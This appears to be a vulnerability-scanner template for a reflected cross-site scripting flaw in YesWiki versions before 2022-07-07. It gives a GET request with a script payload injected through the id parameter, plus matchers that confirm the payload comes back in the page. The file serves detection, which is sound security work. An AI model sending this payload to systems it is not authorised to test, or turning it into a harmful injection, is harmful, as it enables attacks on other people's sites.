id: "yeswiki-xss"
name: "YesWiki <2022-07-07 - Cross-Site Scripting"
severity: "medium"
description: "YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL."
tech:
  - "generic"
tags:
  - "yeswiki"
  - "huntr"
  - "xss"
  - "vuln"
cwe: "CWE-79"
reference: "https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/"
spaExclusion: true
request:
  method: "GET"
  path: "/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<script>alert(document.domain)</script>"
      - "Query failed:"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
